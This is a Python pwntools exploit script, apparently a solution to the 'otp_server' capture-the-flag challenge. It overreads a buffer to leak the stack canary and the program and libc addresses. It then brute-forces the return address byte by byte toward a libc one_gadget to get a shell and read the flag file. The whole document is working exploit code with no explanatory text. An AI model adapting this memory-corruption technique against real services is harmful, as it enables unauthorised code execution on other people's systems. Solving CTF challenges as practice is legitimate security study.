from pwn import *
import signal
import sys
import time

def signal_handler(sig, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
prog_name = './otp_server'
#context.log_level = logging.DEBUG #with debug output
context.binary = prog_name
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("challenges.fbctf.com", 1338)
  libcz = ELF("./libc-2.27.so")
  online=True
elif(debug == 1):
  r = process(prog_name, aslr=False)
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def halt():
  while True:
    log.info( r.recvline() )

def set_key(payload):
  r.recvuntil(">>>")
  r.sendline('1')
  r.recvuntil("key:")
  r.send(payload)

def enc_msg(payload):
  r.recvuntil(">>>")
  r.sendline('2')
  r.recvuntil("encrypt:")
  r.send(payload)

def give_up():
  r.recvuntil(">>>")
  r.sendline('3')

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit():
  #step 1 :- leak,dump
  set_key(0x108 * "A")
  enc_msg(0xff * "A" + "K")  # 'A' ^ '\n' = 'K'
  r.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
  ret=r.recv()
  log.info("key:{0}".format(ret[0:4]))
  log.info("payload:{0}".format(ret[4:0x104]))
  log.info("key_end:{0}".format(ret[0x104:0x104+4]))
  ret=ret[0x108:]
  cookie=u64(("".join(ret[0:0x8])))
  text_leak=u64(("".join(ret[0x8:0x10])))
  text_baseaddr=text_leak - 0xdd0
  libc_leak=u64(("".join(ret[0x10:0x18])))
  libc_baseaddr=(libc_leak-0xe7) - libcz.symbols['__libc_start_main']
  #system = libc_baseaddr + 0x10a38c #0x4f2c5 #one_gadget instead of libcz.symbols['system']
  system = libc_baseaddr + 0xe5863
  log.info("canary:0x{0:8x}".format(cookie))
  log.info("text leak:0x{0:8x}".format(text_leak))
  log.info("text base addr:0x{0:8x}".format(text_baseaddr))
  log.info("libc leak:0x{0:8x}".format(libc_leak))
  log.info("libc base addr:0x{0:8x}".format(libc_baseaddr))
  log.info("System addr:0x{0:8x}".format(system))
 
  #step 2 :- reset key 
  r.sendline("1")
  r.recvuntil("key:")
  r.send(0x108 * '\00')
  
  #step 3 :- rce
  if not online:
    gdb.attach(r, '''
    set follow-fork-mode child
    break fclose
    continue
    finish
    si
    si
    si
    si
    si
    si
    si
    ''')

  counter=0x0
  cnt = 0x4 
  som = 0
  system_half = system & 2**32-1
  while True:
    r.sendline('1')
    r.recvuntil("key:")
    r.send((0x18 -cnt) *"A")
    r.recvuntil(">>>")
    r.sendline('2')
    r.recvuntil("encrypt:")
    r.sendline(0x1 * "A")  #controlled brute-force 4 least-significant byte of ret..
    r.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
    ret=r.recvline().rstrip()
    try:
     brute_pin=u32(ret[-4:].ljust(4,'\x00'))
     #print("{0} brute pin now: {1:x}".format(counter, brute_pin))
    except:
     #print("**ignoring one u32..")
     pass
    counter += 1
    if ((brute_pin >> (24)) & 0xff) == ((system_half >> (24-som)) & 0xff):
      print( hex((brute_pin >> (24)) & 0xff),hex((system_half >> (24-som)) & 0xff))
      print( hex(brute_pin), hex(system_half))
      print("found on {0}.. now need to reset".format(counter-1))
      #reset key 
      r.sendline("1")
      r.recvuntil("key:")
      r.send(0x108 * '\00')
      #break
      cnt += 1
      som += 8
      if som is 32:
        break
  
  give_up()
  if not online:
    r.sendline("cat flag")
  else:
    r.sendline("cat /home/otp_server/flag")
  interactive()  
  return
 
print('Press Ctrl+C')
exploit()
